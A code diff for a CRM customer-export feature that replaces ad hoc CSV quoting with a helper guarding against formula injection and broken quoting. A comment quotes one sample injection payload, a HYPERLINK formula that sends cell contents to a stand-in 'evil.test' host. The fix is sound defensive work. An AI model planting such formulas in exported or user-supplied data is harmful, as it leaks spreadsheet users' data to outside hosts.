@@ -3,7 +3,7 @@ import { CustomerAccount, Order } from '@jamanvaar/types';
 import { db, CustomerRepository, AuditRepository } from '@jamanvaar/database';
 import { LoyaltyProgramModal } from './LoyaltyProgramModal';
 import { MarketingCampaignsModal } from './MarketingCampaignsModal';
-import { formatINR, formatDate, formatTime } from '@jamanvaar/utils';
+import { formatINR, formatDate, formatTime, toCsvRow } from '@jamanvaar/utils';
 import { EmptyState } from '@jamanvaar/ui';
 import {
   Users,
@@ -284,23 +284,29 @@ export const CustomersCrmModule: React.FC<CustomersCrmModuleProps> = ({
       'Notes'
     ];
 
+    // B2-061: this used to hand-roll `"${value}"` quoting per field, which (a) never defended
+    // against CSV/formula injection (a name/notes/address starting with `=`/`+`/`-`/`@` fires as
+    // a formula the moment this file is opened in Excel/Sheets — confirmed live with
+    // `=HYPERLINK("http://evil.test?x="&A1,"Click")` as a customer name) and (b) only escaped
+    // internal `"` on Address/Notes, not on Name/Phone/Email — so a literal `"` in a name broke
+    // the row's own column boundaries. toCsvRow does both, on every field.
     const rows = filteredCustomers.map((c) => [
-      `"${c.name || 'Valued Guest'}"`,
-      `"${c.phone}"`,
-      `"${c.email || ''}"`,
-      `"${(c.address || '').replace(/"/g, '""')}"`,
-      `"${(c.tags || []).join(', ')}"`,
+      c.name || 'Valued Guest',
+      c.phone,
+      c.email || '',
+      c.address || '',
+      (c.tags || []).join(', '),
       c.computedTotalVisits,
       c.computedTotalSpend,
       c.computedAvgOrderValue,
       c.loyaltyPoints || 0,
-      `"${c.dob || ''}"`,
-      `"${c.anniversary || ''}"`,
-      `"${c.computedLastVisit ? formatDate(c.computedLastVisit) : ''}"`,
-      `"${(c.notes || '').replace(/"/g, '""')}"`
+      c.dob || '',
+      c.anniversary || '',
+      c.computedLastVisit ? formatDate(c.computedLastVisit) : '',
+      c.notes || ''
     ]);
 
-    const csvContent = [headers.join(','), ...rows.map((r) => r.join(','))].join('\n');
+    const csvContent = [toCsvRow(headers), ...rows.map(toCsvRow)].join('\r\n');
     const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
     const url = URL.createObjectURL(blob);
     const link = document.createElement('a');
